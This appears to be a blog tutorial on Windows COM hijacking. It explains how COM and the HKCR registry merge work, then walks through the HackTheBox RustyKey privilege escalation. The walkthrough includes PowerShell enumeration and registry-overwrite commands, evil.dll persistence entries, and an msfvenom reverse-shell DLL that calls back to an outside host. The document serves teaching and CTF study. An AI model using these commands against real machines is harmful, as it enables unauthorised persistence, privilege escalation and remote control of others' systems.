---
icon: phone-arrow-down-left
---

# COM Hijacking

## COM Hijacking: How Attackers Hijack Windows From the Inside

You've right-clicked a file a thousand times. Hit "Extract here," watched the files appear. Never thought about what happened under the hood. COM was doing it's thing quietly in the background, and honestly most people will never care. But if your trying to understand how attackers move around inside a Windows machine, you need to understand this.

This post covers how COM works when two separate programs need to talk to each other, and then how that same setup gets abused.

***

### What Even Is COM?

COM stands for Component Object Model. Microsoft built it so that one program can use features from another program, it doesn't matter what language either was written in, or even where there running.

The way I think about it, your app needs to do something it wasn't built to do. Play a video, read a PDF, unzip a file. Instead of rebuilding all that from scratch, it just calls out to another program that already does it. COM is the system that makes that call works cleanly.

To find the right program, your app uses a **CLSID**, a Class Identifier. Just a unique ID like this:

```
{00021401-0000-0000-C000-000000000046}
```

Every COM object on Windows has one. Same ID on your machine, my machine, any Windows machine anywhere. Developers hardcode these into their software so it works the same everywhere without any guesswork.

***

### The Registry: Windows Address Book

When your app ask for a COM object by CLSID, Windows has to figure out where that thing actually lives on disk. It looks it up in the **Registry**, a big database where Windows store all kinds of system configuration.

The entry looks like this:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{your-clsid-here}\
    LocalServer32 = C:\Program Files\VideoPlayer\player.exe
```

This is just Windows saying "that CLSID maps to this file." When you install 7-Zip or VLC or anything else, the installer writes this entry. Thats the whole registration process.

No registry entry means Windows cant find it. The COM object doesn't exist as far as the system is concerned.

***

### How Two Separate Programs Actually Talk

This is the part most articles skip over. When the COM object you need lives in a completely separate program, its own running process, there's a real problem. Two separate processes cannot touch each others memory. Windows enforces this as a hard rule.

So how does Word call a function inside a video player that's running as it's own process?

COM sets up two middlemen.

**The Proxy** sits inside Word. When Word calls `videoPlayer.Play("clip.mp4")`, it's not reaching the real video player at all. Its talking to the proxy. The proxy takes that call, packs it into a message, the function name, the parameters, everything needed, and sends it over to the other process. This packing step is called **marshalling**.

**The Stub** sits inside the video player process. It waits for incoming messages. When the proxy sends something over, the stub unpacks it and calls the actual function inside the video player. Once that function finishes, the stub packs the result back up and sends it back the same way. The proxy receives it and hand it to Word.

Word never saw any of this. From Words point of view, it called a function and got a result. Done.

The channel the messages travel through is called **LPC, Local Procedure Call**. Its a Windows kernel mechanism that gives two processes a shared buffer to pass data through. Neither process can read the others memory, but both can talk to this kernel-managed buffer. Thats how the data crosses.

Full chain in one line: Word calls proxy, proxy packs the call, LPC carries it across, stub unpacks it, real function runs, result comes back the same way.

COM's role was just to start the video player, create the proxy and stub, and setup the LPC channel. After that its done. The proxy and stub handle everything on their own.

***

### How This Gets Abused

Before getting into the attack, there's one thing you need to understand about the registry first.

#### HKCR: The Merged View

You'll often see registry paths starting with `HKCR` which stands for `HKEY_CLASSES_ROOT`. A lot of people think this is just another hive like HKCU or HKLM, but its actually not. HKCR is a merged view that Windows creates by combining two hives together:

* `HKEY_CURRENT_USER\SOFTWARE\Classes`
* `HKEY_LOCAL_MACHINE\SOFTWARE\Classes`

When you look at something under HKCR, Windows is showing you both at the same time. And when there's a conflict, meaning the same key exists in both HKCU and HKLM, Windows always shows you the HKCU one. This is exactly what makes COM hijacking possible.

#### The Two Attack Paths

When Windows looks up a CLSID it checks HKCU before HKLM. These two hives give attackers two completely different angles depending on what access they have.

**Path 1: HKCU, Persistence Without Admin**

Any user on the system can write to their own HKCU. No admin, no UAC prompt, nothing special needed. So if you create a CLSID entry under HKCU that matches a legitimate one in HKLM, Windows will find yours first every single time that COM object gets loaded.

```
HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{target-clsid}\
    InprocServer32 = C:\Users\you\AppData\evil.dll
```

This is primarily a **persistence** technique. You plant your DLL path in the registry, and every time a legitimate application loads that COM object your code runs. It survives reboots, it requires zero elevated privileges, and it blends in with normal system behavior.

**Path 2: HKLM, Privilege Escalation or Lateral Movement**

HKLM entries are normally locked down to admins only. But sometimes a machine is misconfigured and a low-privileged user or group gets write access to a HKLM registry key that they shouldn't have. When that happens, the attacker can overwrite the real registry entry directly.

```
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{target-clsid}\
    InprocServer32 = C:\programdata\evil.dll
```

This is more of a **privilege escalation or lateral movement** angle. If the COM object you're hijacking gets loaded by a higher-privileged process, like a service running as SYSTEM, then your DLL runs in that context and you've escalated. If you can write to HKLM remotely through something like DCOM, it becomes a lateral movement technique.

***

### Real Example: HackTheBox RustyKey

This is exactly path 2 in action. Here's the full walkthrough step by step.

**Step 1: Starting Point**

The attacker already had a shell on the machine as a low-privileged user called `mm.turner`. From here the goal is to escalate privileges.

**Step 2: Find a Hijackable COM Object**

During enumeration, the attacker looked for COM objects registered in HKCR (remember, the merged view) where their user might have unusual write permissions. They found that 7-Zip registers a context menu handler, the thing that shows "Extract here" when you right-click a file or folder.

They pulled the CLSID for it:

```powershell
Get-ChildItem "Registry::HKCR\*\shellex\ContextMenuHandlers","Registry::HKCR\Directory\shellex\ContextMenuHandlers" | Where-Object {$_.PSChildName -match "7-?zip"}
```

CLSID came back as:

```
{23170F69-40C1-278A-1000-000100020000}
```

**Step 3: Check What the Registry Entry Points To**

They looked up that CLSID to find where the real DLL lives:

```powershell
Get-ItemProperty "Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InProcServer32"
```

Result:

```
(default) = C:\Program Files\7-Zip\7-zip.dll
```

So Windows was loading `7-zip.dll` whenever anything triggered the context menu handler.

**Step 4: Check Permissions on That Registry Key**

This is the key step. Normally `mm.turner` would have no business touching this key. But they checked anyway:

```powershell
Get-Acl "Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InProcServer32"
```

And the output showed that `RustyKey\Support` had `FullControl` over that key. And `mm.turner` was a member of the Support group. Thats the misconfiguration, someone granted write access to a HKLM COM entry to a group that shouldn't have it.

**Step 5: Build the Malicious DLL**

The attacker generated a reverse shell payload as a DLL using msfvenom:

```
msfvenom -p windows/x64/shell_reverse_tcp -f dll -o rev.dll LHOST=1.1.1.1 LPORT=111
```

**Step 6: Upload the DLL to the Target**

They uploaded it through their existing Evil-WinRM session to a writable location:

```
C:\programdata\rev.dll
```

**Step 7: Overwrite the Registry Entry**

Now they pointed the CLSID registration at their DLL instead of the real 7-Zip one:

```powershell
Set-ItemProperty "Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InProcServer32" -Name "(default)" -Value "C:\programdata\rev.dll"
```

The entry now read:

```
(default) = C:\programdata\rev.dll
```

Same CLSID. Their DLL now.

**Step 8: Wait for Trigger**

The context menu handler fires whenever anyone on that machine right-clicks a file or folder. Another user on the system triggered it shortly after, Windows loaded `rev.dll` thinking it was 7-Zip, and the attacker got a shell back.
